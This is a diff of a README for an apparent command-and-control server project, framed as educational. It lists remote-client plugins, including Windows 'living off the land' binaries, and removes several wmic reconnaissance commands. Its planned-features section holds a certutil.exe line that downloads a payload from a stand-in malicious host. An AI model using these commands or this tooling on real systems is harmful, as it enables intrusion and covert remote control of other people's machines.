@@ -2,7 +2,7 @@
 
 ## Overview
 
-This repository serves as a Education reference and contains the implementation of a Command and Control (C&C) server used for managing and controlling remote clients. The server facilitates communication with these clients, allowing for command execution, data retrieval, and other operations as needed.
+This repository serves as a educational reference and contains the implementation of a Command and Control (C&C) server used for managing and controlling remote clients. The server facilitates communication with these clients, allowing for command execution, data retrieval, and other operations as needed.
 
 ## Features
 
@@ -21,22 +21,25 @@ This repository serves as a Education reference and contains the implementation 
 2. **Installation**:
    ```bash
    git clone <repository_url>
-   cd c2
+   cd w0lf-c2
    npm install
+
 ## Features
 
-- Client management
-- File/Folder management
-- Registry management
-- Schedule tasks
-- System profiler tools
+- Client was built on five diffent languages (c, rust, powershell, python, js)
+- Multiple client session management
+- Extended features through plugins.
+- Server and client logging
+- Plugins:
+   - Client Manager: A client plugin to manage the remote client.
+   - Cmd.exe Binaries: A client plugin that provides native cmd.exe commands.
+   - File Manager: A client plugin to manage and manipulate files and folders.
+   - System Profiling: A client plugin to profile the system.
+   - Living Off The Land Binaries: A client plugin that provides Windows LOLBin commands.
+   - Screensaver: A server plugin to show a couple screensavers.
 
 ## In The Works
 
-- View Antivirus Info (wmic antivirusproduct get DisplayName,ProductState)
-- View Firewall Rules (wmic firewall get Name,Status)
-- View installed Software (wmic product get Name,Version,Vendor)
-- View all users (wmic useraccount get Name,FullName,Status)
 - Additional communication channels (https, http2, web socket, udp dgram)
    ```js
    // http2
@@ -64,7 +67,7 @@ This repository serves as a Education reference and contains the implementation 
    server.on('message', (msg, rinfo) => {
       console.log(`server got: ${msg} from ${rinfo.address}:${rinfo.port}`);
    });
-- More LOLBas commands
+- Add more LOLBas commands
    ```bash
    # 1. certutil.exe for Downloading Files
    certutil.exe -urlcache -split -f http://malicious-url/payload.exe C:\Windows\Temp\payload.exe
